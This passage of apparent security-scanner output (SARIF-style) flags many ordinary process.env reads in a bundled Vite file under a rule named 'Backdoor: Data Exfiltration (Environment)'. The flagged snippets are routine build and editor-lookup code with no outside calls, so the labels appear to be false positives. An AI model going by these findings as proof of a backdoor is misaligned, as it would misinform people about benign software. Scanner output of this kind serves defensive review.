                      "markdown": "`  );\n  if (optimizerContext.cancelled) return { context: void 0, idToExports };\n  const define = {\n    \"process.env.NODE_ENV\": JSON.stringify(process.env.NODE_ENV || config.mode)\n  };\n  const platform = ssr && config.ssr?.target !== \"webworker\" ? \"node\" : \"browser\";\n  const external = [...optimizeDeps2?.exclude ?? []];\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 50809,
                  "startColumn": 5,
                  "endLine": 50809,
                  "endColumn": 16,
                  "snippet": {
                    "text": "  );\n  if (optimizerContext.cancelled) return { context: void 0, idToExports };\n  const define = {\n    \"process.env.NODE_ENV\": JSON.stringify(process.env.NODE_ENV || config.mode)\n  };\n  const platform = ssr && config.ssr?.target !== \"webworker\" ? \"node\" : \"browser\";\n  const external = [...optimizeDeps2?.exclude ?? []];\n",
                    "rendered": {
                      "text": "  );\n  if (optimizerContext.cancelled) return { context: void 0, idToExports };\n  const define = {\n    \"process.env.NODE_ENV\": JSON.stringify(process.env.NODE_ENV || config.mode)\n  };\n  const platform = ssr && config.ssr?.target !== \"webworker\" ? \"node\" : \"browser\";\n  const external = [...optimizeDeps2?.exclude ?? []];\n",
                      "markdown": "`  );\n  if (optimizerContext.cancelled) return { context: void 0, idToExports };\n  const define = {\n    \"process.env.NODE_ENV\": JSON.stringify(process.env.NODE_ENV || config.mode)\n  };\n  const platform = ssr && config.ssr?.target !== \"webworker\" ? \"node\" : \"browser\";\n  const external = [...optimizeDeps2?.exclude ?? []];\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 48745,
                  "startColumn": 36,
                  "endLine": 48745,
                  "endColumn": 47,
                  "snippet": {
                    "text": "const noop$3 = () => {\n};\nconst EMPTY_OBJECT = Object.freeze({});\nconst debugSourcemapCombineFilter = process.env.DEBUG_VITE_SOURCEMAP_COMBINE_FILTER;\nconst debugSourcemapCombine = createDebugger(\"vite:sourcemap-combine\", {\n  onlyWhenFocused: true\n});\n",
                    "rendered": {
                      "text": "const noop$3 = () => {\n};\nconst EMPTY_OBJECT = Object.freeze({});\nconst debugSourcemapCombineFilter = process.env.DEBUG_VITE_SOURCEMAP_COMBINE_FILTER;\nconst debugSourcemapCombine = createDebugger(\"vite:sourcemap-combine\", {\n  onlyWhenFocused: true\n});\n",
                      "markdown": "`const noop$3 = () => {\n};\nconst EMPTY_OBJECT = Object.freeze({});\nconst debugSourcemapCombineFilter = process.env.DEBUG_VITE_SOURCEMAP_COMBINE_FILTER;\nconst debugSourcemapCombine = createDebugger(\"vite:sourcemap-combine\", {\n  onlyWhenFocused: true\n});\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47418,
                  "startColumn": 24,
                  "endLine": 47418,
                  "endColumn": 35,
                  "snippet": {
                    "text": "          {\n            \"process.env.NODE_ENV\": nodeEnv,\n            \"global.process.env.NODE_ENV\": nodeEnv,\n            \"globalThis.process.env.NODE_ENV\": nodeEnv\n          },\n          config\n        );\n",
                    "rendered": {
                      "text": "          {\n            \"process.env.NODE_ENV\": nodeEnv,\n            \"global.process.env.NODE_ENV\": nodeEnv,\n            \"globalThis.process.env.NODE_ENV\": nodeEnv\n          },\n          config\n        );\n",
                      "markdown": "`          {\n            \"process.env.NODE_ENV\": nodeEnv,\n            \"global.process.env.NODE_ENV\": nodeEnv,\n            \"globalThis.process.env.NODE_ENV\": nodeEnv\n          },\n          config\n        );\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47417,
                  "startColumn": 20,
                  "endLine": 47417,
                  "endColumn": 31,
                  "snippet": {
                    "text": "          id,\n          {\n            \"process.env.NODE_ENV\": nodeEnv,\n            \"global.process.env.NODE_ENV\": nodeEnv,\n            \"globalThis.process.env.NODE_ENV\": nodeEnv\n          },\n          config\n",
                    "rendered": {
                      "text": "          id,\n          {\n            \"process.env.NODE_ENV\": nodeEnv,\n            \"global.process.env.NODE_ENV\": nodeEnv,\n            \"globalThis.process.env.NODE_ENV\": nodeEnv\n          },\n          config\n",
                      "markdown": "`          id,\n          {\n            \"process.env.NODE_ENV\": nodeEnv,\n            \"global.process.env.NODE_ENV\": nodeEnv,\n            \"globalThis.process.env.NODE_ENV\": nodeEnv\n          },\n          config\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47416,
                  "startColumn": 13,
                  "endLine": 47416,
                  "endColumn": 24,
                  "snippet": {
                    "text": "          code,\n          id,\n          {\n            \"process.env.NODE_ENV\": nodeEnv,\n            \"global.process.env.NODE_ENV\": nodeEnv,\n            \"globalThis.process.env.NODE_ENV\": nodeEnv\n          },\n",
                    "rendered": {
                      "text": "          code,\n          id,\n          {\n            \"process.env.NODE_ENV\": nodeEnv,\n            \"global.process.env.NODE_ENV\": nodeEnv,\n            \"globalThis.process.env.NODE_ENV\": nodeEnv\n          },\n",
                      "markdown": "`          code,\n          id,\n          {\n            \"process.env.NODE_ENV\": nodeEnv,\n            \"global.process.env.NODE_ENV\": nodeEnv,\n            \"globalThis.process.env.NODE_ENV\": nodeEnv\n          },\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47411,
                  "startColumn": 82,
                  "endLine": 47411,
                  "endColumn": 93,
                  "snippet": {
                    "text": "      if (id === normalizedClientEntry || id === normalizedEnvEntry) {\n        return injectConfigValues(code);\n      } else if (!options?.ssr && code.includes(\"process.env.NODE_ENV\")) {\n        const nodeEnv = config.define?.[\"process.env.NODE_ENV\"] || JSON.stringify(process.env.NODE_ENV || config.mode);\n        return await replaceDefine(\n          code,\n          id,\n",
                    "rendered": {
                      "text": "      if (id === normalizedClientEntry || id === normalizedEnvEntry) {\n        return injectConfigValues(code);\n      } else if (!options?.ssr && code.includes(\"process.env.NODE_ENV\")) {\n        const nodeEnv = config.define?.[\"process.env.NODE_ENV\"] || JSON.stringify(process.env.NODE_ENV || config.mode);\n        return await replaceDefine(\n          code,\n          id,\n",
                      "markdown": "`      if (id === normalizedClientEntry || id === normalizedEnvEntry) {\n        return injectConfigValues(code);\n      } else if (!options?.ssr && code.includes(\"process.env.NODE_ENV\")) {\n        const nodeEnv = config.define?.[\"process.env.NODE_ENV\"] || JSON.stringify(process.env.NODE_ENV || config.mode);\n        return await replaceDefine(\n          code,\n          id,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47411,
                  "startColumn": 41,
                  "endLine": 47411,
                  "endColumn": 52,
                  "snippet": {
                    "text": "      if (id === normalizedClientEntry || id === normalizedEnvEntry) {\n        return injectConfigValues(code);\n      } else if (!options?.ssr && code.includes(\"process.env.NODE_ENV\")) {\n        const nodeEnv = config.define?.[\"process.env.NODE_ENV\"] || JSON.stringify(process.env.NODE_ENV || config.mode);\n        return await replaceDefine(\n          code,\n          id,\n",
                    "rendered": {
                      "text": "      if (id === normalizedClientEntry || id === normalizedEnvEntry) {\n        return injectConfigValues(code);\n      } else if (!options?.ssr && code.includes(\"process.env.NODE_ENV\")) {\n        const nodeEnv = config.define?.[\"process.env.NODE_ENV\"] || JSON.stringify(process.env.NODE_ENV || config.mode);\n        return await replaceDefine(\n          code,\n          id,\n",
                      "markdown": "`      if (id === normalizedClientEntry || id === normalizedEnvEntry) {\n        return injectConfigValues(code);\n      } else if (!options?.ssr && code.includes(\"process.env.NODE_ENV\")) {\n        const nodeEnv = config.define?.[\"process.env.NODE_ENV\"] || JSON.stringify(process.env.NODE_ENV || config.mode);\n        return await replaceDefine(\n          code,\n          id,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47410,
                  "startColumn": 49,
                  "endLine": 47410,
                  "endColumn": 60,
                  "snippet": {
                    "text": "    async transform(code, id, options) {\n      if (id === normalizedClientEntry || id === normalizedEnvEntry) {\n        return injectConfigValues(code);\n      } else if (!options?.ssr && code.includes(\"process.env.NODE_ENV\")) {\n        const nodeEnv = config.define?.[\"process.env.NODE_ENV\"] || JSON.stringify(process.env.NODE_ENV || config.mode);\n        return await replaceDefine(\n          code,\n",
                    "rendered": {
                      "text": "    async transform(code, id, options) {\n      if (id === normalizedClientEntry || id === normalizedEnvEntry) {\n        return injectConfigValues(code);\n      } else if (!options?.ssr && code.includes(\"process.env.NODE_ENV\")) {\n        const nodeEnv = config.define?.[\"process.env.NODE_ENV\"] || JSON.stringify(process.env.NODE_ENV || config.mode);\n        return await replaceDefine(\n          code,\n",
                      "markdown": "`    async transform(code, id, options) {\n      if (id === normalizedClientEntry || id === normalizedEnvEntry) {\n        return injectConfigValues(code);\n      } else if (!options?.ssr && code.includes(\"process.env.NODE_ENV\")) {\n        const nodeEnv = config.define?.[\"process.env.NODE_ENV\"] || JSON.stringify(process.env.NODE_ENV || config.mode);\n        return await replaceDefine(\n          code,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47238,
                  "startColumn": 24,
                  "endLine": 47238,
                  "endColumn": 35,
                  "snippet": {
                    "text": "    });\n    const patternKeys = Object.keys(userDefine);\n    if (replaceProcessEnv && Object.keys(processEnv).length) {\n      patternKeys.push(\"process.env\");\n    }\n    if (Object.keys(importMetaKeys).length) {\n      patternKeys.push(\"import.meta.env\", \"import.meta.hot\");\n",
                    "rendered": {
                      "text": "    });\n    const patternKeys = Object.keys(userDefine);\n    if (replaceProcessEnv && Object.keys(processEnv).length) {\n      patternKeys.push(\"process.env\");\n    }\n    if (Object.keys(importMetaKeys).length) {\n      patternKeys.push(\"import.meta.env\", \"import.meta.hot\");\n",
                      "markdown": "`    });\n    const patternKeys = Object.keys(userDefine);\n    if (replaceProcessEnv && Object.keys(processEnv).length) {\n      patternKeys.push(\"process.env\");\n    }\n    if (Object.keys(importMetaKeys).length) {\n      patternKeys.push(\"import.meta.env\", \"import.meta.hot\");\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47193,
                  "startColumn": 18,
                  "endLine": 47193,
                  "endColumn": 29,
                  "snippet": {
                    "text": "      \"globalThis.process.env\": `{}`,\n      \"process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"global.process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"globalThis.process.env.NODE_ENV\": JSON.stringify(nodeEnv)\n    });\n  }\n  const importMetaKeys = {};\n",
                    "rendered": {
                      "text": "      \"globalThis.process.env\": `{}`,\n      \"process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"global.process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"globalThis.process.env.NODE_ENV\": JSON.stringify(nodeEnv)\n    });\n  }\n  const importMetaKeys = {};\n",
                      "markdown": "`      \"globalThis.process.env\": `{}`,\n      \"process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"global.process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"globalThis.process.env.NODE_ENV\": JSON.stringify(nodeEnv)\n    });\n  }\n  const importMetaKeys = {};\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47192,
                  "startColumn": 14,
                  "endLine": 47192,
                  "endColumn": 25,
                  "snippet": {
                    "text": "      \"global.process.env\": `{}`,\n      \"globalThis.process.env\": `{}`,\n      \"process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"global.process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"globalThis.process.env.NODE_ENV\": JSON.stringify(nodeEnv)\n    });\n  }\n",
                    "rendered": {
                      "text": "      \"global.process.env\": `{}`,\n      \"globalThis.process.env\": `{}`,\n      \"process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"global.process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"globalThis.process.env.NODE_ENV\": JSON.stringify(nodeEnv)\n    });\n  }\n",
                      "markdown": "`      \"global.process.env\": `{}`,\n      \"globalThis.process.env\": `{}`,\n      \"process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"global.process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"globalThis.process.env.NODE_ENV\": JSON.stringify(nodeEnv)\n    });\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47191,
                  "startColumn": 7,
                  "endLine": 47191,
                  "endColumn": 18,
                  "snippet": {
                    "text": "      \"process.env\": `{}`,\n      \"global.process.env\": `{}`,\n      \"globalThis.process.env\": `{}`,\n      \"process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"global.process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"globalThis.process.env.NODE_ENV\": JSON.stringify(nodeEnv)\n    });\n",
                    "rendered": {
                      "text": "      \"process.env\": `{}`,\n      \"global.process.env\": `{}`,\n      \"globalThis.process.env\": `{}`,\n      \"process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"global.process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"globalThis.process.env.NODE_ENV\": JSON.stringify(nodeEnv)\n    });\n",
                      "markdown": "`      \"process.env\": `{}`,\n      \"global.process.env\": `{}`,\n      \"globalThis.process.env\": `{}`,\n      \"process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"global.process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"globalThis.process.env.NODE_ENV\": JSON.stringify(nodeEnv)\n    });\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47190,
                  "startColumn": 18,
                  "endLine": 47190,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    Object.assign(processEnv, {\n      \"process.env\": `{}`,\n      \"global.process.env\": `{}`,\n      \"globalThis.process.env\": `{}`,\n      \"process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"global.process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"globalThis.process.env.NODE_ENV\": JSON.stringify(nodeEnv)\n",
                    "rendered": {
                      "text": "    Object.assign(processEnv, {\n      \"process.env\": `{}`,\n      \"global.process.env\": `{}`,\n      \"globalThis.process.env\": `{}`,\n      \"process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"global.process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"globalThis.process.env.NODE_ENV\": JSON.stringify(nodeEnv)\n",
                      "markdown": "`    Object.assign(processEnv, {\n      \"process.env\": `{}`,\n      \"global.process.env\": `{}`,\n      \"globalThis.process.env\": `{}`,\n      \"process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"global.process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"globalThis.process.env.NODE_ENV\": JSON.stringify(nodeEnv)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47189,
                  "startColumn": 14,
                  "endLine": 47189,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    const nodeEnv = process.env.NODE_ENV || config.mode;\n    Object.assign(processEnv, {\n      \"process.env\": `{}`,\n      \"global.process.env\": `{}`,\n      \"globalThis.process.env\": `{}`,\n      \"process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"global.process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n",
                    "rendered": {
                      "text": "    const nodeEnv = process.env.NODE_ENV || config.mode;\n    Object.assign(processEnv, {\n      \"process.env\": `{}`,\n      \"global.process.env\": `{}`,\n      \"globalThis.process.env\": `{}`,\n      \"process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"global.process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n",
                      "markdown": "`    const nodeEnv = process.env.NODE_ENV || config.mode;\n    Object.assign(processEnv, {\n      \"process.env\": `{}`,\n      \"global.process.env\": `{}`,\n      \"globalThis.process.env\": `{}`,\n      \"process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n      \"global.process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47188,
                  "startColumn": 7,
                  "endLine": 47188,
                  "endColumn": 18,
                  "snippet": {
                    "text": "  if (!isBuildLib) {\n    const nodeEnv = process.env.NODE_ENV || config.mode;\n    Object.assign(processEnv, {\n      \"process.env\": `{}`,\n      \"global.process.env\": `{}`,\n      \"globalThis.process.env\": `{}`,\n      \"process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n",
                    "rendered": {
                      "text": "  if (!isBuildLib) {\n    const nodeEnv = process.env.NODE_ENV || config.mode;\n    Object.assign(processEnv, {\n      \"process.env\": `{}`,\n      \"global.process.env\": `{}`,\n      \"globalThis.process.env\": `{}`,\n      \"process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n",
                      "markdown": "`  if (!isBuildLib) {\n    const nodeEnv = process.env.NODE_ENV || config.mode;\n    Object.assign(processEnv, {\n      \"process.env\": `{}`,\n      \"global.process.env\": `{}`,\n      \"globalThis.process.env\": `{}`,\n      \"process.env.NODE_ENV\": JSON.stringify(nodeEnv),\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47186,
                  "startColumn": 20,
                  "endLine": 47186,
                  "endColumn": 31,
                  "snippet": {
                    "text": "  const isBuildLib = isBuild && config.build.lib;\n  const processEnv = {};\n  if (!isBuildLib) {\n    const nodeEnv = process.env.NODE_ENV || config.mode;\n    Object.assign(processEnv, {\n      \"process.env\": `{}`,\n      \"global.process.env\": `{}`,\n",
                    "rendered": {
                      "text": "  const isBuildLib = isBuild && config.build.lib;\n  const processEnv = {};\n  if (!isBuildLib) {\n    const nodeEnv = process.env.NODE_ENV || config.mode;\n    Object.assign(processEnv, {\n      \"process.env\": `{}`,\n      \"global.process.env\": `{}`,\n",
                      "markdown": "`  const isBuildLib = isBuild && config.build.lib;\n  const processEnv = {};\n  if (!isBuildLib) {\n    const nodeEnv = process.env.NODE_ENV || config.mode;\n    Object.assign(processEnv, {\n      \"process.env\": `{}`,\n      \"global.process.env\": `{}`,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 45239,
                  "startColumn": 6,
                  "endLine": 45239,
                  "endColumn": 17,
                  "snippet": {
                    "text": "      return ['--line', lineNumber, '--column', columnNumber, fileName]\n  }\n\n  if (process.env.LAUNCH_EDITOR) {\n    return [fileName, lineNumber, columnNumber]\n  }\n\n",
                    "rendered": {
                      "text": "      return ['--line', lineNumber, '--column', columnNumber, fileName]\n  }\n\n  if (process.env.LAUNCH_EDITOR) {\n    return [fileName, lineNumber, columnNumber]\n  }\n\n",
                      "markdown": "`      return ['--line', lineNumber, '--column', columnNumber, fileName]\n  }\n\n  if (process.env.LAUNCH_EDITOR) {\n    return [fileName, lineNumber, columnNumber]\n  }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 45168,
                  "startColumn": 12,
                  "endLine": 45168,
                  "endColumn": 23,
                  "snippet": {
                    "text": "  if (process.env.VISUAL) {\n    return [process.env.VISUAL]\n  } else if (process.env.EDITOR) {\n    return [process.env.EDITOR]\n  }\n\n  return [null]\n",
                    "rendered": {
                      "text": "  if (process.env.VISUAL) {\n    return [process.env.VISUAL]\n  } else if (process.env.EDITOR) {\n    return [process.env.EDITOR]\n  }\n\n  return [null]\n",
                      "markdown": "`  if (process.env.VISUAL) {\n    return [process.env.VISUAL]\n  } else if (process.env.EDITOR) {\n    return [process.env.EDITOR]\n  }\n\n  return [null]\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 45167,
                  "startColumn": 13,
                  "endLine": 45167,
                  "endColumn": 24,
                  "snippet": {
                    "text": "  // Last resort, use old skool env vars\n  if (process.env.VISUAL) {\n    return [process.env.VISUAL]\n  } else if (process.env.EDITOR) {\n    return [process.env.EDITOR]\n  }\n\n",
                    "rendered": {
                      "text": "  // Last resort, use old skool env vars\n  if (process.env.VISUAL) {\n    return [process.env.VISUAL]\n  } else if (process.env.EDITOR) {\n    return [process.env.EDITOR]\n  }\n\n",
                      "markdown": "`  // Last resort, use old skool env vars\n  if (process.env.VISUAL) {\n    return [process.env.VISUAL]\n  } else if (process.env.EDITOR) {\n    return [process.env.EDITOR]\n  }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 45166,
                  "startColumn": 12,
                  "endLine": 45166,
                  "endColumn": 23,
                  "snippet": {
                    "text": "\n  // Last resort, use old skool env vars\n  if (process.env.VISUAL) {\n    return [process.env.VISUAL]\n  } else if (process.env.EDITOR) {\n    return [process.env.EDITOR]\n  }\n",
                    "rendered": {
                      "text": "\n  // Last resort, use old skool env vars\n  if (process.env.VISUAL) {\n    return [process.env.VISUAL]\n  } else if (process.env.EDITOR) {\n    return [process.env.EDITOR]\n  }\n",
                      "markdown": "`\n  // Last resort, use old skool env vars\n  if (process.env.VISUAL) {\n    return [process.env.VISUAL]\n  } else if (process.env.EDITOR) {\n    return [process.env.EDITOR]\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
